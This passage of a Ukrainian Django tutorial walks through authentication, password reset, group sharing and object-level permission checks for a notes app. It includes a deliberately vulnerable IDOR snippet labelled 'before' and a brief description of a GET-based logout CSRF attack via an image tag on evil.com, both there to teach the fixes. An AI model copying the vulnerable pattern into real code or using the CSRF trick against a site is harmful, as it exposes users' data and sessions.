                 class="form-control"
                 autocomplete="current-password">
        </div>

        <!-- next: куди повернутись після входу (наприклад /notes/42/) -->
        <input type="hidden" name="next" value="{{ next }}">
        {# LoginView передає 'next' у context — URL куди перенаправити після входу #}

        <button type="submit" class="btn btn-primary w-100 py-2">
          <i class="bi bi-box-arrow-in-right me-2"></i>Увійти
        </button>
      </form>

      <hr class="my-3">
      <div class="d-flex justify-content-between">
        <a href="{% url 'notes_app:register' %}" class="text-decoration-none small">
          <i class="bi bi-person-plus me-1"></i>Зареєструватись
        </a>
        <a href="{% url 'password_reset' %}" class="text-decoration-none small text-muted">
          {# 'password_reset' — вбудована URL з django.contrib.auth.urls #}
          Забули пароль?
        </a>
      </div>

    </div>
  </div>
</div>
{% endblock %}
```

### notes_app/views.py — Registration view

`django.contrib.auth.urls` не включає реєстрацію — треба написати самому:

```python
# notes_app/views.py
from django.contrib.auth.forms import UserCreationForm
from django.contrib.auth import login


def register(request):
    """
    Реєстрація нового юзера.
    Після успішної реєстрації — auto-login і redirect до note_list.
    """
    if request.user.is_authenticated:
        # Вже залогінений → не показуємо форму реєстрації
        return redirect('notes_app:note_list')

    if request.method == 'POST':
        form = UserCreationForm(request.POST)
        if form.is_valid():
            user = form.save()
            # auto-login: не змушуємо юзера логінитись одразу після реєстрації
            login(request, user)
            messages.success(request, f'Вітаємо, {user.username}! Акаунт створено.')
            return redirect('notes_app:note_list')
    else:
        form = UserCreationForm()

    return render(request, 'registration/register.html', {'form': form})
```

### templates/registration/register.html

```html
{% extends 'base.html' %}
{% load crispy_forms_tags %}

{% block body %}
<div class="min-vh-100 d-flex align-items-center justify-content-center bg-light">
  <div class="card shadow" style="width: 440px;">
    <div class="card-body p-4">

      <div class="text-center mb-4">
        <i class="bi bi-person-plus-fill display-4 text-success"></i>
        <h5 class="fw-bold mt-2 mb-0">Реєстрація</h5>
        <p class="text-muted small">Створи новий акаунт</p>
      </div>

      <form method="post">
        {% csrf_token %}
        {{ form|crispy }}
        {# UserCreationForm: username, password1, password2 #}
        {# crispy: автоматично Bootstrap 5 стилі #}
        <button type="submit" class="btn btn-success w-100 mt-2 py-2">
          <i class="bi bi-check-circle me-2"></i>Зареєструватись
        </button>
      </form>

      <hr class="my-3">
      <p class="text-center text-muted small mb-0">
        Вже є акаунт? <a href="{% url 'login' %}">Увійти</a>
      </p>

    </div>
  </div>
</div>
{% endblock %}
```

---

## Крок 4 — Password Reset

Django надає 4 views для password reset. Треба написати тільки шаблони.

### templates/registration/password_reset_form.html

```html
{% extends 'base.html' %}

{% block body %}
<div class="min-vh-100 d-flex align-items-center justify-content-center bg-light">
  <div class="card shadow" style="width: 440px;">
    <div class="card-body p-4">

      <div class="text-center mb-4">
        <i class="bi bi-key-fill display-4 text-warning"></i>
        <h5 class="fw-bold mt-2">Відновлення паролю</h5>
        <p class="text-muted small">
          Введіть ваш email — надішлемо посилання для скидання.
        </p>
      </div>

      <form method="post">
        {% csrf_token %}
        <div class="mb-3">
          <label class="form-label fw-semibold">Email адреса</label>
          <input type="email"
                 name="email"
                 class="form-control"
                 autofocus
                 placeholder="alice@example.com">
          <div class="form-text text-muted">
            Якщо акаунт з таким email існує — отримаєш листа.
            {# Безпечно: Django не повідомляє чи існує email чи ні #}
          </div>
        </div>
        <button type="submit" class="btn btn-warning w-100 py-2 fw-semibold">
          <i class="bi bi-envelope me-2"></i>Надіслати посилання
        </button>
      </form>

      <div class="text-center mt-3">
        <a href="{% url 'login' %}" class="text-muted small">
          <i class="bi bi-arrow-left me-1"></i>Назад до входу
        </a>
      </div>

    </div>
  </div>
</div>
{% endblock %}
```

### templates/registration/password_reset_done.html

```html
{% extends 'base.html' %}
{% block body %}
<div class="min-vh-100 d-flex align-items-center justify-content-center bg-light">
  <div class="card shadow" style="width: 440px;">
    <div class="card-body p-4 text-center">

      <i class="bi bi-envelope-check-fill display-4 text-success mb-3"></i>
      <h5 class="fw-bold">Посилання надіслано!</h5>
      <p class="text-muted">
        Перевірте вашу пошту і перейдіть за посиланням щоб скинути пароль.
      </p>

      <!-- DEV підказка: email у docker logs -->
      <div class="alert alert-info text-start small mt-3">
        <strong><i class="bi bi-terminal me-1"></i>DEV режим:</strong>
        Email не надсилається реально. Знайди його у логах Docker:
        <code class="d-block mt-1">docker compose logs -f web</code>
        Скопіюй URL що починається з
        <code>/accounts/reset/...</code>
      </div>

      <a href="{% url 'login' %}" class="btn btn-outline-secondary btn-sm mt-2">
        Повернутись до входу
      </a>

    </div>
  </div>
</div>
{% endblock %}
```

### templates/registration/password_reset_confirm.html

```html
{% extends 'base.html' %}
{% load crispy_forms_tags %}
{% block body %}
<div class="min-vh-100 d-flex align-items-center justify-content-center bg-light">
  <div class="card shadow" style="width: 440px;">
    <div class="card-body p-4">

      {% if validlink %}
        {# validlink = True → токен дійсний (не прострочений, не використаний) #}
        <div class="text-center mb-4">
          <i class="bi bi-lock-fill display-4 text-primary"></i>
          <h5 class="fw-bold mt-2">Новий пароль</h5>
        </div>
        <form method="post">
          {% csrf_token %}
          {{ form|crispy }}
          {# SetPasswordForm: new_password1, new_password2 #}
          {# Django автоматично запускає PASSWORD_VALIDATORS на цих полях #}
          <button type="submit" class="btn btn-primary w-100 mt-2 py-2">
            <i class="bi bi-check-lg me-2"></i>Зберегти новий пароль
          </button>
        </form>

      {% else %}
        {# validlink = False → токен прострочений (>72 год) або вже використаний #}
        <div class="text-center py-3">
          <i class="bi bi-exclamation-triangle-fill display-4 text-danger mb-3"></i>
          <h5 class="fw-bold">Посилання недійсне</h5>
          <p class="text-muted">
            Термін дії посилання вийшов (72 год) або воно вже було використано.
          </p>
          <a href="{% url 'password_reset' %}" class="btn btn-outline-warning mt-2">
            <i class="bi bi-arrow-clockwise me-1"></i>Запросити нове посилання
          </a>
        </div>
      {% endif %}

    </div>
  </div>
</div>
{% endblock %}
```

### templates/registration/password_reset_complete.html

```html
{% extends 'base.html' %}
{% block body %}
<div class="min-vh-100 d-flex align-items-center justify-content-center bg-light">
  <div class="card shadow" style="width: 400px;">
    <div class="card-body p-4 text-center">

      <i class="bi bi-check-circle-fill display-4 text-success mb-3"></i>
      <h5 class="fw-bold">Пароль успішно змінено!</h5>
      <p class="text-muted">Тепер ви можете увійти з новим паролем.</p>
      <a href="{% url 'login' %}" class="btn btn-primary mt-2 py-2 px-4">
        <i class="bi bi-box-arrow-in-right me-2"></i>Увійти
      </a>

    </div>
  </div>
</div>
{% endblock %}
```

### templates/registration/password_reset_email.html — текст листа

```
{# Це ТЕКСТОВИЙ email — без HTML тегів! Django шукає цей шаблон автоматично. #}
Привіт!

Ви запросили скидання пароля для акаунту на Notes Chat App.

Перейдіть за посиланням щоб встановити новий пароль:

{{ protocol }}://{{ domain }}{% url 'password_reset_confirm' uidb64=uid token=token %}

Посилання дійсне 72 години. Після використання воно більше не працюватиме.

Якщо ви не запитували скидання пароля — просто проігноруйте цей лист.
Ваш пароль залишається незмінним.

— Notes Chat App
```

**Змінні у листі:**
- `{{ protocol }}` — `http` або `https`
- `{{ domain }}` — `localhost:8001` або `mysite.com`
- `{{ uid }}` — base64-encoded user PK
- `{{ token }}` — HMAC-підписаний одноразовий токен

---

## Крок 5 — Password Change

Password change вимагає що юзер **вже залогінений** (на відміну від password reset).
`PasswordChangeView` сам перевіряє `is_authenticated` — не треба `@login_required`.

### templates/registration/password_change_form.html

```html
{% extends 'layouts/dashboard.html' %}
{% load crispy_forms_tags %}

{% block topbar_title %}Зміна пароля{% endblock %}

{% block content %}
<div class="row justify-content-center">
  <div class="col-md-6">
    <div class="card shadow-sm">
      <div class="card-header py-3">
        <h6 class="mb-0 fw-semibold">
          <i class="bi bi-key me-2"></i>Зміна пароля
        </h6>
      </div>
      <div class="card-body">
        <form method="post">
          {% csrf_token %}
          {{ form|crispy }}
          {# PasswordChangeForm: old_password, new_password1, new_password2 #}
          <hr>
          <div class="d-flex gap-2">
            <button type="submit" class="btn btn-primary">
              <i class="bi bi-check-lg me-1"></i>Змінити пароль
            </button>
            <a href="{% url 'notes_app:note_list' %}" class="btn btn-outline-secondary">
              Скасувати
            </a>
          </div>
        </form>
      </div>
    </div>
  </div>
</div>
{% endblock %}
```

### templates/registration/password_change_done.html

```html
{% extends 'layouts/dashboard.html' %}

{% block topbar_title %}Пароль змінено{% endblock %}

{% block content %}
<div class="card shadow-sm" style="max-width: 480px;">
  <div class="card-body text-center py-5">
    <i class="bi bi-check-circle-fill display-4 text-success mb-3"></i>
    <h5 class="fw-bold">Пароль успішно змінено!</h5>
    <p class="text-muted">Наступного разу входьте з новим паролем.</p>
    <a href="{% url 'notes_app:note_list' %}" class="btn btn-primary mt-2">
      <i class="bi bi-house me-2"></i>До нотаток
    </a>
  </div>
</div>
{% endblock %}
```

### Посилання у navbar dropdown

```html
{# templates/layouts/dashboard.html — dropdown юзера у navbar: #}
<ul class="dropdown-menu dropdown-menu-dark dropdown-menu-end shadow">
  <li>
    <span class="dropdown-item-text text-white-50 small">{{ request.user.username }}</span>
  </li>
  <li><hr class="dropdown-divider border-secondary"></li>
  <li>
    <a class="dropdown-item" href="{% url 'notes_app:group_list' %}">
      <i class="bi bi-people me-2"></i>Мої групи
    </a>
  </li>
  <li>
    <a class="dropdown-item" href="{% url 'password_change' %}">
      {# 'password_change' — вбудована URL з django.contrib.auth.urls #}
      <i class="bi bi-key me-2"></i>Змінити пароль
    </a>
  </li>
  <li><hr class="dropdown-divider border-secondary"></li>
  <li>
    <!-- Logout — POST запит (захист від CSRF logout attack) -->
    <form method="post" action="{% url 'logout' %}">
      {% csrf_token %}
      <button type="submit" class="dropdown-item text-danger">
        <i class="bi bi-box-arrow-right me-2"></i>Вийти
      </button>
    </form>
  </li>
</ul>
```

> **Чому logout — POST, а не GET?**
> GET запити можна вбудувати в `<img src="/accounts/logout/">` на evil.com.
> Будь-хто хто відкрив сторінку зловмисника — автоматично розлогінеться.
> POST вимагає CSRF токен → неможливо виконати з іншого сайту.

---

## Крок 6 — Object-Level Permissions

Патерн застосовується **у кожному view** що приймає `pk` і змінює дані.

```python
# notes_app/views.py — повна реалізація note_edit з усіма перевірками:

from django.contrib.auth.decorators import login_required
from django.shortcuts import get_object_or_404, redirect, render
from django.contrib import messages
from django.db.models import Q
from .models import Note
from .forms import NoteForm
from . import services, selectors


@login_required
def note_edit(request, pk):
    """
    Редагування нотатки — два рівні перевірки:
    1. @login_required          → AuthN: залогінений?
    2. Q(user) | Q(group)       → read access: власна або групова нотатка?
    3. note.user == request.user → AuthZ write: редагувати може лише власник

    Чому Q-filter, а не get_object_or_404(..., user=request.user)?
      get_object_or_404(Note, pk=pk, user=request.user) блокував би
      членів групи від перегляду нотатки через URL /notes/<pk>/edit/.
      Реальна логіка: член групи може ЧИТАТИ нотатку (бачить її),
      але РЕДАГУВАТИ — лише власник.
    """
    user_groups = request.user.groups.all()
    note = get_object_or_404(
        Note.objects.filter(Q(user=request.user) | Q(group__in=user_groups)),
        pk=pk,
    )
    # ↑ SQL: SELECT * FROM note WHERE pk=<pk> AND (user_id=<uid> OR group_id IN (...))
    # → 404 якщо ані власник, ані член групи

    if note.user != request.user:
        # Член групи може ПЕРЕГЛЯДАТИ нотатку, але не редагувати чужу
        messages.error(request, 'Ти не можеш редагувати нотатку іншого користувача.')
        return redirect('notes_app:note_detail', pk=pk)

    if request.method == 'POST':
        form = NoteForm(request.POST, instance=note, user=request.user)
        if form.is_valid():
            # tags — M2M поле; NoteForm.cleaned_data['tags'] → QuerySet об'єктів Tag
            # tag_ids потрібні сервісу окремо (не передаємо dict напряму!)
            tags = form.cleaned_data.get('tags')
            tag_ids = [t.id for t in tags] if tags else []
            services.update_note(
                note,
                title=form.cleaned_data['title'],
                content=form.cleaned_data.get('content', ''),
                priority=form.cleaned_data.get('priority', note.priority),
                notebook=form.cleaned_data.get('notebook'),
                is_pinned=form.cleaned_data.get('is_pinned', note.is_pinned),
                group=form.cleaned_data.get('group'),
                tag_ids=tag_ids,
            )
            # update_note(note, *, title, content, ...) — keyword-only args
            # Не можна викликати як update_note(note, form.cleaned_data) → TypeError
            messages.success(request, f'✅ Нотатку "{note.title}" оновлено!')
            return redirect('notes_app:note_detail', pk=note.pk)
    else:
        form = NoteForm(instance=note, user=request.user)

    return render(request, 'notes_app/note_form.html', {
        'form': form,
        'title': f'Редагувати: {note.title}',
        'note': note,
        'action': 'Зберегти зміни',
    })


@login_required
def note_delete(request, pk):
    # Аналогічно: Q-filter для доступу + owner check перед видаленням
    user_groups = request.user.groups.all()
    note = get_object_or_404(
        Note.objects.filter(Q(user=request.user) | Q(group__in=user_groups)),
        pk=pk,
    )
    if note.user != request.user:
        messages.error(request, 'Ти не можеш видалити нотатку іншого користувача.')
        return redirect('notes_app:note_list')
    if request.method == 'POST':
        title = note.title
        services.delete_note(note)
        messages.warning(request, f'🗑️ Нотатку "{title}" видалено.')
        return redirect('notes_app:note_list')
    return render(request, 'notes_app/note_confirm_delete.html', {'note': note})
```

**До vs Після:**

```python
# ✗ ДО (IDOR вразливість):
note = get_object_or_404(Note, pk=pk)
# SQL: SELECT * FROM note WHERE pk=43
# Повертає нотатку Боба якщо pk=43 — жодної перевірки власника!

# ✓ ПІСЛЯ для особистих об'єктів (Notebook, TodoList, тощо):
notebook = get_object_or_404(Notebook, pk=pk, user=request.user)
# SQL: SELECT * FROM notebook WHERE pk=43 AND user_id=42
# pk=43 + user_id=42 → не знайдено → 404

# ✓ ПІСЛЯ для спільних об'єктів (Note — може бути груповою):
user_groups = request.user.groups.all()
note = get_object_or_404(
    Note.objects.filter(Q(user=request.user) | Q(group__in=user_groups)),
    pk=pk,
)
# SQL: SELECT * FROM note WHERE pk=43 AND (user_id=42 OR group_id IN (1,3))
# Власник АБО член групи — обидва отримують доступ для читання
# Для запису: ще перевіряємо note.user == request.user окремо
```

---

## Крок 7 — Models: Group FK

**Місце:** `notes_app/models.py`

```python
from django.contrib.auth.models import User, Group


class Note(models.Model):
    user = models.ForeignKey(
        User, on_delete=models.CASCADE, related_name='notes'
    )
    # ── Group FK: для спільного доступу ──────────────────────────────────────
    group = models.ForeignKey(
        Group,
        on_delete=models.SET_NULL,  # ← SET_NULL, не CASCADE!
        null=True,                   # ← NULL = особиста нотатка (за замовчуванням)
        blank=True,                  # ← у формі поле необов'язкове
        related_name='notes',
    )
    # ── решта полів ───────────────────────────────────────────────────────────
    notebook = models.ForeignKey(
        'Notebook', on_delete=models.SET_NULL, null=True, blank=True,
        related_name='notes'
    )
    title    = models.CharField(max_length=200)
    content  = models.TextField(blank=True)
    priority = models.PositiveSmallIntegerField(default=1)
    is_pinned    = models.BooleanField(default=False)
    is_archived  = models.BooleanField(default=False)
    created_at   = models.DateTimeField(auto_now_add=True)
    updated_at   = models.DateTimeField(auto_now=True)
    tags = models.ManyToManyField('Tag', blank=True)


class ShoppingList(models.Model):
    user = models.ForeignKey(User, on_delete=models.CASCADE)
    # ShoppingList теж має group FK для шерингу:
    group = models.ForeignKey(
        Group,
        on_delete=models.SET_NULL,
        null=True, blank=True,
        related_name='shopping_lists',
    )
    title = models.CharField(max_length=200)
    store_name = models.CharField(max_length=100, blank=True)
```

### Чому `SET_NULL`, а не `CASCADE`?

```
CASCADE:  видалення групи → видаляються ВСІ нотатки групи
          Аліса видаляє "Команда розробки" → Боб втрачає спільні нотатки!
          Несподівано і незворотньо.

SET_NULL: видалення групи → нотатки залишаються, але стають особистими (group=NULL)
          Аліса видаляє групу → нотатки переходять до особистих просторів власників
          Безпечна поведінка: дані не губляться, тільки шерінг зупиняється.

Django виконує SET_NULL автоматично в CASCADE delete:
  DELETE FROM auth_group WHERE id=5
  → UPDATE note SET group_id=NULL WHERE group_id=5     ← автоматично!
  → UPDATE shoppinglist SET group_id=NULL WHERE group_id=5  ← теж!
```

---

## Крок 8 — Selectors

**Місце:** `notes_app/selectors.py`

```python
from django.db.models import Q, Count
from django.contrib.auth.models import Group
from .models import Note, Notebook, Tag


def get_user_notes(user, *, archived=False, notebook=None, tag=None, search=None):
    """
    Повертає нотатки юзера + нотатки груп де він є членом.

    Q(user=user) | Q(group__in=user_groups) — ключовий Q-фільтр.
    select_related/prefetch_related: мінімум SQL запитів (без N+1).
    """
    user_groups = user.groups.all()
    qs = Note.objects.filter(
        Q(user=user) | Q(group__in=user_groups),   # власні або групові
        is_archived=archived,
    ).select_related(
        'notebook',   # JOIN → без +1 SQL при відображенні кольору записника
        'group',      # JOIN → без +1 SQL при відображенні назви групи
    ).prefetch_related(
        'tags',       # IN query → без +1 SQL при відображенні тегів
    )

    if notebook is not None:
        qs = qs.filter(notebook=notebook)
    if tag is not None:
        qs = qs.filter(tags=tag)
    if search:
        qs = qs.filter(
            Q(title__icontains=search) | Q(content__icontains=search)
        )

    return qs.order_by('-is_pinned', '-priority', '-updated_at')


def get_user_groups(user):
    """Групи юзера з кількістю учасників (annotate)."""
    return user.groups.annotate(
        member_count=Count('user')
        # annotate: додає поле 'member_count' до кожного Group об'єкта
        # SQL: SELECT g.*, COUNT(ug.user_id) as member_count
        #        FROM auth_group g
        #        JOIN auth_user_groups ug ON ug.group_id = g.id
        #        WHERE g.id IN (Alice's group ids)
        #        GROUP BY g.id
    ).order_by('name')


def get_group_with_members(group_id, user):
    """
    Повертає групу з учасниками ТІЛЬКИ якщо юзер є її членом.
    Якщо не член → None (не Http404 — вирішує view).
    """
    try:
        group = Group.objects.prefetch_related('user_set').get(pk=group_id)
        if not group.user_set.filter(pk=user.pk).exists():
            return None   # не член → view поверне 404
        return group
    except Group.DoesNotExist:
        return None
```

**Пояснення `select_related` vs `prefetch_related`:**

```python
# select_related: JOIN → один SQL запит
# Використовується для ForeignKey і OneToOne (N-to-1)
.select_related('notebook')
# SQL: SELECT note.*, nb.* FROM note LEFT JOIN notebook nb ON note.notebook_id = nb.id

# prefetch_related: окремий IN запит → два SQL запити
# Використовується для ManyToMany (M-to-N)
.prefetch_related('tags')
# SQL 1: SELECT note.* FROM note WHERE ...
# SQL 2: SELECT tag.* FROM tag INNER JOIN note_tags ON ... WHERE note_id IN (1,2,3,...)

# Без select_related/prefetch_related → N+1 проблема:
# 10 нотаток → 10 запитів для notebook + 10 для tags = 21 SQL запит!
# З оптимізацією → 3 SQL запити (notes + notebooks + tags)
```

---

## Крок 9 — Services

**Місце:** `notes_app/services.py`

```python
from django.contrib.auth.models import Group, User
from django.db import transaction


def create_group(*, name, creator):
    """
    Створює групу і автоматично додає creator як першого учасника.

    Без транзакції: якщо add() провалиться → Group існує без учасників.
    З atomic(): обидві операції або обидві rollback.
    """
    with transaction.atomic():
        group = Group.objects.create(name=name)
        group.user_set.add(creator)   # M:N INSERT у auth_user_groups
    return group


def add_user_to_group(group, username):
    """
    Додає юзера до групи за username.
    Повертає (True, '') або (False, 'повідомлення про помилку').

    Чому не raise Exception?
    View очікує tuple (ok, msg) щоб відобразити помилку у формі без 500.
    """
    try:
        user = User.objects.get(username=username)
    except User.DoesNotExist:
        return False, f'Користувача «{username}» не знайдено.'

    if group.user_set.filter(pk=user.pk).exists():
        return False, f'«{username}» вже є членом цієї групи.'

    group.user_set.add(user)
    return True, ''


def remove_user_from_group(group, user):
    """Видаляє юзера з групи. M:N DELETE з auth_user_groups."""
    group.user_set.remove(user)


def delete_group(group):
    """
    Видаляє групу.
    Django автоматично SET_NULL для Note.group і ShoppingList.group.
    Жодних нотаток не втрачається.
    """
    group.delete()
```

---

## Крок 10 — Group Views

**Місце:** `notes_app/views.py`

```python
from django.contrib.auth.models import Group, User
from django.core.exceptions import PermissionDenied
from django.http import Http404
from . import selectors, services


@login_required
def group_list(request):
    """Список груп до яких належить поточний юзер."""
    groups = selectors.get_user_groups(request.user)
    return render(request, 'notes_app/group_list.html', {'groups': groups})


@login_required
def group_create(request):
    """
    Створення нової групи. Creator автоматично стає першим учасником.

    Валідація — через форму GroupCreateForm, а не вручну через request.POST.get().
    Переваги форм над raw POST:
      • clean_name() перевіряє унікальність назви автоматично
      • Всі помилки доступні через form.errors → рендеримо в шаблоні
      • Узгоджено з іншими view — один підхід у всьому проєкті
      • DRY: логіка валідації в одному місці (forms.py), не в кожному view
    """
    if request.method == 'POST':
        form = GroupCreateForm(request.POST)
        if form.is_valid():
            group = services.create_group(
                name=form.cleaned_data['name'],
                creator=request.user,
            )
            messages.success(request, f'✅ Групу «{group.name}» створено! Ви перший учасник.')
            return redirect('notes_app:group_detail', pk=group.pk)
    else:
        form = GroupCreateForm()
    return render(request, 'notes_app/group_form.html', {
        'form': form, 'title': 'Нова група', 'action': 'Створити',
    })


@login_required
def group_detail(request, pk):
    """
    Перегляд групи: учасники + дії (додати/видалити/покинути).

    Один view — три дії через один POST:
      action='add'    → додати учасника за username
      action='remove' → видалити конкретного учасника (по user_pk)
      action='leave'  → поточний юзер покидає групу
    """
    group = selectors.get_group_with_members(pk, request.user)
    if group is None:
        raise Http404('Групу не знайдено або у вас немає доступу.')

    error = None

    if request.method == 'POST':
        action = request.POST.get('action')

        if action == 'add':
            username = request.POST.get('username', '').strip()
            ok, msg = services.add_user_to_group(group, username)
            if ok:
                messages.success(request, f'«{username}» додано до групи.')
                return redirect('notes_app:group_detail', pk=pk)
            else:
                error = msg

        elif action == 'remove':
            remove_pk = request.POST.get('user_pk')
            try:
                target = User.objects.get(pk=remove_pk)
                if target == request.user:
                    messages.error(request, 'Щоб покинути групу — використай кнопку "Покинути".')
                else:
                    services.remove_user_from_group(group, target)
                    messages.success(request, f'«{target.username}» видалено з групи.')
            except User.DoesNotExist:
                pass
            return redirect('notes_app:group_detail', pk=pk)

        elif action == 'leave':
            group_name = group.name
            services.remove_user_from_group(group, request.user)
            messages.info(request, f'Ви покинули групу «{group_name}».')
            return redirect('notes_app:group_list')

    return render(request, 'notes_app/group_detail.html', {
        'group':   group,
        'members': group.user_set.all(),
        'error':   error,
    })


@login_required
def group_delete(request, pk):
    """
    Видалення групи.
    Тільки якщо request.user є членом → 403 (ми знаємо що група існує).
    """
    group = get_object_or_404(Group, pk=pk)
    if not group.user_set.filter(pk=request.user.pk).exists():
        raise PermissionDenied   # 403: знаємо що існує, але не маємо доступу
    if request.method == 'POST':
        name = group.name
        services.delete_group(group)
        messages.warning(
            request,
            f'Групу «{name}» видалено. Спільні нотатки і списки стали особистими.'
        )
        return redirect('notes_app:group_list')
    return render(request, 'notes_app/group_confirm_delete.html', {'group': group})
```

**Ключовий патерн — один view, три дії:**

```
POST /groups/5/   {action: 'add',    username: 'bob'}     → додати Боба
POST /groups/5/   {action: 'remove', user_pk: 99}         → видалити user.pk=99
POST /groups/5/   {action: 'leave'}                       → поточний юзер іде

Навіщо один view а не три URL?
  - Вся логіка управління групою в одному місці
  - Спільний middleware check (membership)
  - Простіше для тестування (один тест класу TestCase)
  - Менше URL patterns
```

---

## Крок 11 — Group Templates

**Місце:** `notes_app/templates/notes_app/`

### group_list.html — картки груп

```html
{% extends 'layouts/dashboard.html' %}
{% block topbar_title %}Мої групи{% endblock %}
{% block content %}

<div class="d-flex justify-content-between align-items-center mb-4">
  <h5 class="fw-semibold mb-0">
    <i class="bi bi-people me-2 text-primary"></i>Мої групи
  </h5>
  <a href="{% url 'notes_app:group_create' %}" class="btn btn-primary btn-sm">
    <i class="bi bi-person-plus me-1"></i>Нова група
  </a>
</div>

{% if groups %}
<div class="row row-cols-1 row-cols-md-3 g-3">
  {% for group in groups %}
  <div class="col">
    <div class="card h-100 shadow-sm border-0">
      <div class="card-body">
        <h6 class="fw-semibold mb-1">{{ group.name }}</h6>
        <p class="text-muted small mb-0">
          <i class="bi bi-person me-1"></i>
          {{ group.member_count }} учасник{{ group.member_count|pluralize:",и,ів" }}
          {# member_count = annotate з get_user_groups selector #}
        </p>
      </div>
      <div class="card-footer bg-transparent border-0 pt-0">
        <a href="{% url 'notes_app:group_detail' group.pk %}"
           class="btn btn-outline-primary btn-sm">
          <i class="bi bi-arrow-right me-1"></i>Відкрити
        </a>
        <a href="{% url 'notes_app:group_chat' group.pk %}"
           class="btn btn-outline-success btn-sm ms-1">
          <i class="bi bi-chat me-1"></i>Чат
        </a>
      </div>
    </div>
  </div>
  {% endfor %}
</div>

{% else %}
<div class="text-center py-5 text-muted">
  <i class="bi bi-people display-4 mb-3"></i>
  <h6>Груп ще немає</h6>
  <p class="small">Створи групу і додай учасників для спільного доступу до нотаток.</p>
  <a href="{% url 'notes_app:group_create' %}" class="btn btn-primary btn-sm">
    Створити першу групу
  </a>
</div>
{% endif %}

{% endblock %}
```

### group_detail.html — учасники і дії

```html
{% extends 'layouts/dashboard.html' %}
{% block topbar_title %}Група: {{ group.name }}{% endblock %}
{% block content %}

<div class="row g-4">

  <!-- ── Список учасників ── -->
  <div class="col-md-6">
    <div class="card shadow-sm">
      <div class="card-header d-flex justify-content-between align-items-center">
        <h6 class="mb-0">
          <i class="bi bi-people me-2"></i>Учасники ({{ members.count }})
        </h6>
      </div>
      <ul class="list-group list-group-flush">
        {% for member in members %}
        <li class="list-group-item d-flex justify-content-between align-items-center">
          <span>
            <i class="bi bi-person-circle me-2 text-muted"></i>
            {{ member.username }}
            {% if member == request.user %}
              <span class="badge bg-success rounded-pill ms-1">Ти</span>
            {% endif %}
          </span>
          <!-- Видалити учасника — action=remove -->
          {% if member != request.user %}
          <form method="post" class="d-inline">
            {% csrf_token %}
            <input type="hidden" name="action" value="remove">
            <input type="hidden" name="user_pk" value="{{ member.pk }}">
            <button type="submit"
                    class="btn btn-outline-danger btn-sm"
                    onclick="return confirm('Видалити {{ member.username }} з групи?')">
              <i class="bi bi-x-lg"></i>
            </button>
          </form>
          {% endif %}
        </li>
        {% endfor %}
      </ul>
    </div>
  </div>

  <!-- ── Панель дій ── -->
  <div class="col-md-6">

    <!-- Додати учасника — action=add -->
    <div class="card shadow-sm mb-3">
      <div class="card-header">
        <h6 class="mb-0"><i class="bi bi-person-plus me-2"></i>Додати учасника</h6>
      </div>
      <div class="card-body">
        {% if error %}
        <div class="alert alert-danger py-2 small mb-3">
          <i class="bi bi-exclamation-circle me-1"></i>{{ error }}
        </div>
        {% endif %}
        <form method="post" class="d-flex gap-2">
          {% csrf_token %}
          <input type="hidden" name="action" value="add">
          <input type="text"
                 name="username"
                 class="form-control form-control-sm"
                 placeholder="username учасника"
                 required>
          <button type="submit" class="btn btn-primary btn-sm">
            <i class="bi bi-plus-lg"></i>
          </button>
        </form>
      </div>
    </div>

    <!-- Чат групи -->
    <div class="card shadow-sm mb-3">
      <div class="card-body d-flex align-items-center gap-3">
        <i class="bi bi-chat-dots-fill text-success fs-4"></i>
        <div>
          <h6 class="mb-0">Груповий чат</h6>
          <p class="text-muted small mb-0">WebSocket чат у реальному часі</p>
        </div>
        <a href="{% url 'notes_app:group_chat' group.pk %}"
           class="btn btn-outline-success btn-sm ms-auto">
          Відкрити чат
        </a>
      </div>
    </div>

    <!-- Небезпечна зона: покинути або видалити -->
    <div class="card border-danger shadow-sm">
      <div class="card-header border-danger">
        <h6 class="text-danger mb-0">
          <i class="bi bi-exclamation-triangle me-2"></i>Небезпечна зона
        </h6>
      </div>
      <div class="card-body">
        <!-- Покинути групу — action=leave -->
        <form method="post" class="d-inline">
          {% csrf_token %}
          <input type="hidden" name="action" value="leave">
          <button type="submit"
                  class="btn btn-outline-danger btn-sm me-2"
                  onclick="return confirm('Покинути групу «{{ group.name }}»?')">
            <i class="bi bi-door-open me-1"></i>Покинути групу
          </button>
        </form>
        <!-- Видалити групу — окремий URL (GET → confirm page) -->
        <a href="{% url 'notes_app:group_delete' group.pk %}"
           class="btn btn-danger btn-sm">
          <i class="bi bi-trash me-1"></i>Видалити групу
        </a>
      </div>
    </div>

  </div>
</div>
{% endblock %}
```

### group_confirm_delete.html

```html
{% extends 'layouts/dashboard.html' %}
{% block topbar_title %}Видалення групи{% endblock %}
{% block content %}

<div class="card border-danger shadow-sm" style="max-width: 500px;">
  <div class="card-header bg-danger text-white">
    <h6 class="mb-0">
      <i class="bi bi-trash me-2"></i>Видалення групи «{{ group.name }}»
    </h6>
  </div>
  <div class="card-body">
    <div class="alert alert-warning">
      <strong><i class="bi bi-exclamation-triangle me-1"></i>Після видалення:</strong>
      <ul class="mb-0 mt-2 ps-3">
        <li>Група та список учасників видаляться <strong>назавжди</strong>.</li>
        <li>Нотатки і списки покупок <strong>НЕ видаляються</strong> —
            вони стають особистими (<code>group = NULL</code>
            через <code>on_delete=SET_NULL</code>).</li>
        <li>Чат групи і всі повідомлення <strong>видаляться</strong>
            (<code>ChatMessage.group FK CASCADE</code>).</li>
      </ul>
    </div>
    <form method="post">
      {% csrf_token %}
      <button type="submit" class="btn btn-danger me-2">
        <i class="bi bi-trash me-1"></i>Так, видалити
      </button>
      <a href="{% url 'notes_app:group_detail' group.pk %}"
         class="btn btn-outline-secondary">
        Скасувати
      </a>
    </form>
  </div>
</div>

{% endblock %}
```

---

## Структура файлів

```
notes_chat_app/
│
├── notes_project/
│   ├── settings.py          ★ LOGIN_URL, EMAIL_BACKEND, CSRF_TRUSTED_ORIGINS,
│   │                           SESSION_COOKIE_HTTPONLY, X_FRAME_OPTIONS
│   └── urls.py              ★ include('django.contrib.auth.urls') + notes_app
│
├── notes_app/
│   ├── models.py            ★ Note.group FK(Group, SET_NULL)
│   │                           ShoppingList.group FK(Group, SET_NULL)
│   │                           ChatMessage.group FK(Group, CASCADE)
│   ├── selectors.py         ★ get_user_notes (Q filter)
│   │                           get_user_groups (annotate member_count)
│   │                           get_group_with_members (membership check)
│   ├── services.py          ★ create_group, add_user_to_group,
│   │                           remove_user_from_group, delete_group
│   ├── views.py             ★ register, group_list, group_create,
│   │                           group_detail (3-action POST), group_delete
│   │                           + IDOR захист у note_edit, note_delete, etc.
